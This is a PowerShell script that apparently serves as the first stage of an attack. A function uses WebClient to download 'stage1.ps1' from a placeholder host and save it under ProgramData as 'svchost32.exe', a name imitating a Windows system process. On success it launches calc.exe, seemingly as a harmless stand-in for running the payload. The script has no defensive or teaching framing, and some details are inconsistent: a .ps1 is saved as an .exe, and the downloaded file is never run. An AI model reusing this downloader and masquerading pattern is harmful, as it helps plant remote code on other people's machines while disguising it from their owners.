
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$FetchUrl = 'https://contoso.com/stage1.ps1',
    [string]$DownloadPath = 'C:\ProgramData\svchost32.exe',
    [int]$ConnectionTimeout = 81
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $FetchResult = Get-Stage1Payload -SourceUrl $FetchUrl -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout
    if ($FetchResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Verbose "stage marker 37 reached"
